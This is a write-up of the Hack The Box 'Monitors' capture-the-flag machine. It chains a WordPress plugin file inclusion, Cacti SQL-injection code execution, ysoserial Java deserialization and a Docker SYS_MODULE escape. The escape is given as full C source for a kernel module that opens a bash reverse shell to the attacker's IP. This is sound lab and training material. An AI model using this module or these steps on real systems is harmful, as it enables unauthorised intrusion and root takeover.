Start with `Nmap` scanning to detect open ports.

The server only had two ports open, I started by enumerating the web server, this is what I had.

![https://imgur.com/gleTbyw.png](https://imgur.com/gleTbyw.png)

It seems that `virtual hosting` was being applied, storing different domains on the same IP, for this I opened `/etc/hosts` and included the `monitors.htb` domain.

![https://imgur.com/uipe3ri.png](https://imgur.com/uipe3ri.png)

Now he reported what he really had.

![https://imgur.com/8wWXphm.png](https://imgur.com/8wWXphm.png)

I made a `whatweb` to see if it ran any `CMS`.

```bash
â”Œâ”€â”€(rootðŸ’€kali)-[/home/â€¦/HTB/Monitors/machine/nmap]
â””â”€# whatweb http://monitors.htb/                                                   	 
http://monitors.htb/ [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.238], JQuery, MetaGenerator[WordPress 5.5.1], Script[text/javascript], Title[Welcome to Monitor &#8211; Taking hardware monitoring seriously], UncommonHeaders[link], WordPress[5.5.1]
```

Apparently it was a web server with `Wordpress` installed, enumerating the web a bit I found that it had a `directory listing` of the plugins, I found one called `wp-with-spritz`.

![https://imgur.com/AgMIHZ0.png](https://imgur.com/AgMIHZ0.png)

I searched the internet to see if there was any exploit related to the plugin.

![https://imgur.com/RBKDaS5.png](https://imgur.com/RBKDaS5.png)

I found a few, I settled on the one posted on [exploit.db](https://exploitdb.com/).

![https://imgur.com/GCEmKDt.png](https://imgur.com/GCEmKDt.png)

Looking at it I saw that the web server was vulnerable to `Local File Inclusion`, meaning that it could see local files on the machine, I tried to enumerate the `/etc/hosts` to confirm the vulnerability.

![https://imgur.com/5EuTLGD.png](https://imgur.com/5EuTLGD.png)

Indeed, I could list files, in this case I tried to list the `WordPress` configuration file with `curl`, these usually have hardcoded credentials, after a few attempts trying to find the path I found it.

![https://imgur.com/c6a0jRF.png](https://imgur.com/c6a0jRF.png)

Something that caught my attention was that it did not interpret the `PHP` code so I did not have to use a "wrapper".

![https://imgur.com/2RGpKpo.png](https://imgur.com/2RGpKpo.png)

Now, I tried these credentials in the `WordPress` login panel but no luck.

![https://imgur.com/A51K99w.png](https://imgur.com/A51K99w.png)

Taking advantage of the `LFI` vulnerability I tried to enumerate the `000-default.conf` file. This file could have information about domains or subdomains that could be operational on the system.

![https://imgur.com/c6a0jRF.png](https://imgur.com/c6a0jRF.png)

And yes, I found `cacti.monitors.htb`, included it in `/etc/hosts` and accessed the web, it reported a login panel.

![https://imgur.com/zyVFcWE.png](https://imgur.com/zyVFcWE.png)

I immediately tried the credentials I had obtained from the `WordPress` configuration file enumeration.

![https://imgur.com/PkEkPML.png](https://imgur.com/PkEkPML.png)

And I authenticate myself.

![https://imgur.com/CDcopSP.png](https://imgur.com/CDcopSP.png)

Since I knew the version I decided to look for an exploit for this panel and found one that had to be authenticated.

![https://imgur.com/YyyEGtR.png](https://imgur.com/YyyEGtR.png)

Looking into it a bit I saw that it took advantage of a malicious `SQL` query to exploit the vulnerability, to gain access it uses a reverse shell with `mkfifo`.

![https://imgur.com/wiX1Rvr.png](https://imgur.com/wiX1Rvr.png)

Run the exploit using the panel login credentials, my IP, port and gain access to the machine.

![https://imgur.com/DsIengg.png](https://imgur.com/DsIengg.png)

I did a `TTY` scan and enumerated users, found `markus` operational on the system.

![https://imgur.com/hDZXMFI.png](https://imgur.com/hDZXMFI.png)

Since I didn't have the ability to see the user's "flag" I enumerated the machine a bit and found a file that caught my attention called `cacti-backup.service`, when I looked at it I found a path that was in the `markus` directory, going to this directory I saw that there was a folder called `.backup` that was hidden.

![https://imgur.com/h65jw3V.png](https://imgur.com/h65jw3V.png)

Looking at the file called `backup.sh` I found credentials in clear text.

![https://imgur.com/K9IPqJs.png](https://imgur.com/K9IPqJs.png)

I tried using them to pivot to user `markus` and it worked.

![https://imgur.com/ZZUd7un.png](https://imgur.com/ZZUd7un.png)

Now I could see the user's "flag".

![VYcjmdD](https://user-images.githubusercontent.com/69093629/137590879-5e9fa574-952e-485c-b29b-0b794e4740c8.jpg)

In the main directory of `markus` there was also a file called `note.txt`, when I looked at it I found the following.

![https://imgur.com/EupX3rZ.png](https://imgur.com/EupX3rZ.png)

It said that I disabled `phpinfo` in `php.ini` but it didn't update a Docker image, this caught my attention, I thought that later I could use this information for something, for the moment I decided to continue investigating the machine a little more, enumerating `SUID` permissions I didn't find anything interesting.

![https://imgur.com/5rzyhO2.png](https://imgur.com/5rzyhO2.png)

The machine also had SSH connectivity with the credentials found above, I stuck with this Shell.

![https://imgur.com/9PPj1ah.png](https://imgur.com/9PPj1ah.png)

Doing some more enumeration I found a web server on the machine running on port `8443`.

![GJcJ7u7](https://user-images.githubusercontent.com/69093629/137591307-06bb32b2-63a5-481e-a255-c270fa681f66.png)

This caught my attention so I decided to see what I had, for this I had to do a `port forwarding` to have the port open on my `localhost`, since the machine had `SSH` I did it with that.

![https://imgur.com/Qh2lrZM.png](https://imgur.com/Qh2lrZM.png)

And I found the following on the web server.

![https://imgur.com/1l26Keu.png](https://imgur.com/1l26Keu.png)

I did `fuzzing` with `gobuster` and found different directories.

![https://imgur.com/T1VS0uE.png](https://imgur.com/T1VS0uE.png)

Accessing `manufacturing` redirected me to a login panel.

![https://imgur.com/YzPEcwm.png](https://imgur.com/YzPEcwm.png)

I could see the version that was being used.

![https://imgur.com/aFPSFBd.png](https://imgur.com/aFPSFBd.png)

I decided to do a search for exploits on the internet.

![https://imgur.com/FGS1Ybf.png](https://imgur.com/FGS1Ybf.png)

I found that it was vulnerable to insecure Java deserialization, a "ysoserial" in every rule.

![Captura de pantalla (13)](https://user-images.githubusercontent.com/69093629/137787594-99ecfb5e-09c8-423a-ac1b-8a6ba30b70ca.png)

To verify if the server was vulnerable to this attack I accessed the following path `/webtools/corol/xmlrpc`, I found that it existed.

![https://imgur.com/c6ikmko.png](https://imgur.com/c6ikmko.png)

What I did to exploit this vulnerability is to follow the exploit steps manually.

First I downloaded `ysoserial` to my machine and created a `bash` file called `shell.sh` with a reverse shell, I created the payload that would allow me to download the `shell.sh` file and export it to a writable path.

![https://imgur.com/RmqR7so.png](https://imgur.com/RmqR7so.png)

I opened a `Python` web server hosting `shell.sh` and sent a `POST` request with the payload created previously with `ysoserial`.

![https://imgur.com/J8xMYLD.png](https://imgur.com/J8xMYLD.png)

I received a `GET` request on my server, this was a good sign, I created one more payload by having it run `shell.sh` to receive a reverse shell, I set port `443` to listen with netcat and made another `POST` request with the new payload.

![https://imgur.com/fP0neKf.png](https://imgur.com/fP0neKf.png)

I received a `GET` request to my server again.

![https://imgur.com/P2b7v8a.png](https://imgur.com/P2b7v8a.png)

And gain access to the system via netcat.

![https://imgur.com/NJ8KfPa.png](https://imgur.com/NJ8KfPa.png)

Looking at my IP I found that I was in a Docker container.

![https://imgur.com/YQ8na73.png](https://imgur.com/YQ8na73.png)

Remembering the note from before, it said: "update docker image for production use", this task was reported as "not done", I thought it could be a clue of something, enumerating the machine well I found a docker "capability" that I could take advantage of.

![https://imgur.com/9P9pfm5.png](https://imgur.com/9P9pfm5.png)

`SYS_MODULE`, I decided to look for information about a possible privilege escalation.

![https://imgur.com/z0rHr51.png](https://imgur.com/z0rHr51.png)

To take advantage of this "capability" the idea was to create a malicious kernel module, to do this the first thing was to create a program to invoke the reverse shell, I did it with the following code written in `c` and I called it `reverse-shell.c`.

```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.16.32/443 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

Next you have to create a `MakeFile` to compile the kernel module, for this I used the following code.

```make
obj-m +=reverse-shell.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Now I just compiled the kernel module with `make` on the victim machine, listened with `nc` on port `443` and did an `insmod` on the `reverse-shell.ko` file exported by the compilation, and I now have access to the system from `nc`, and I can now view the `root` flag.
